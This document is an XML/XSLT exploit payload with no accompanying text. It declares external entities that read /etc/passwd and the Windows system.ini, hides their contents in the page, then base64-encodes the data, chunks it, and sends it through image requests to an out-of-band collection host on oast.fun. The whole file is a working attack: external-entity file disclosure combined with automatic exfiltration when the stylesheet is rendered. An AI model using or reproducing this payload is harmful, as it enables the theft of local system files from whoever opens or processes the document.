<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<!DOCTYPE div [
  <!ENTITY passwd_p        "file:///etc/passwd">
  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('')"/>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <div style="display:none">
        <p class="&passwd_p;">&passwd_c;</p>
        <p class="&sysini_p;">&sysini_c;</p>
      </div>

      <div id="r" style="width:40rem"></div>

      <script>
        function b64encode(str) {
          return btoa(unescape(encodeURIComponent(str)));
        }

        function chunkString(str, size) {
          const out = [];
          for (let i = 0; i < str.length; i += size) {
            out.push(str.slice(i, i + size));
          }
          return out;
        }

        let collected = '';
        document.querySelectorAll('p').forEach(p => {
          collected += 'PATH:' + p.className + '\n';
          collected += 'CONTENT:\n' + p.innerHTML + '\n\n';

          document.querySelector('#r').innerHTML += `
local file path:
&lt;textarea style="width:100%;height:1.5rem">${p.className}&lt;/textarea>&lt;br/>
local file content:
&lt;textarea style="width:100%;height:60rem">${p.innerHTML}&lt;/textarea>&lt;br/>&lt;br/>`;
        });

        const encoded = b64encode(collected);
        const chunks = chunkString(encoded, 350);

        function sendChunk(i) {
          if (i >= chunks.length) {
            return;
          }
          const img = new Image();
          img.src =
            'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/' +
            i + '/' + chunks[i] + '?t=' + Date.now();
          document.body.appendChild(img);
          setTimeout(() => sendChunk(i + 1), 400);
        }

        sendChunk(0);
      </script>
    </body>
  </xsl:template>
</xsl:stylesheet>
